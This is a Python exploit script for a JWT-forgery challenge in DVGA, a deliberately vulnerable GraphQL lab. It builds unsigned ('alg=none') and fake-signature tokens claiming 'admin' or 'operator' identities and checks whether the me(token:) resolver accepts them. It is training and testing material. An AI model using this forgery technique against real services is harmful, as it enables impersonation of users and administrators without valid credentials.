#!/usr/bin/env python3
"""
dvga_challenge_05_jwt_forgery.py — JWT forgery via me(token:).

DVGA's `me(token:)` resolver decodes the supplied JWT with signature
verification disabled (and `alg: none` accepted) and trusts the `identity`
claim as the acting user. So a client can mint its own token for ANY identity
and the server will honour it.

RELIABLE signal: `me(token:)` returns a user object whose username matches the
forged `identity` claim — i.e. we can become admin / operator without a real
login. We forge `alg=none` and HS256 (with the known/empty secret) variants and
check which ones the server accepts. We print the identity we achieved, not
secrets.
Run: python3 dvga_challenge_05_jwt_forgery.py [--config ...]
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="JWT forgery via me(token:)")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)
    hdrs = dv.consumer_headers(805)

    targets = ["admin", "operator"]
    variants = [
        ("alg=none", lambda ident: dv.make_jwt(ident, alg="none")),
        ("hs256 fake-sig", lambda ident: dv.make_jwt(ident, alg="HS256", sig="fakesig")),
    ]

    hits = 0
    for target in targets:
        for vname, forge in variants:
            try:
                tok = forge(target)
            except Exception as e:
                print(f"target={target!r} variant={vname!r} -> forge error {e}")
                continue
            r = dv.graphql(base, 'query { me(token: "%s") { id username } }' % tok,
                           None, cfg, hdrs, tout)
            if r is None:
                print(f"target={target!r} variant={vname!r} -> transport error")
                continue
            body = r.json() if r.headers.get("content-type", "").find("json") >= 0 else {}
            me = (body.get("data") or {}).get("me") or {}
            achieved = me.get("username")
            ok = (achieved is not None) and (str(achieved).lower() == target.lower())
            if ok:
                hits += 1
            print(f"target={target!r:10} variant={vname:18} -> "
                  f"{'[FINDING: forged identity honoured] as ' + str(achieved) if ok else 'rejected/absent'}")

    print(f"\nDone — {hits}/{len(targets) * len(variants)} forgery variant(s) accepted.")
    if hits:
        print("[FINDING] me(token:) trusts an unverified JWT `identity` claim (alg=none / weak secret) — "
              "any client can impersonate any user, including admin.")
    else:
        print("[ok] no forged token was honoured (server may verify signatures on this build).")


if __name__ == "__main__":
    main()
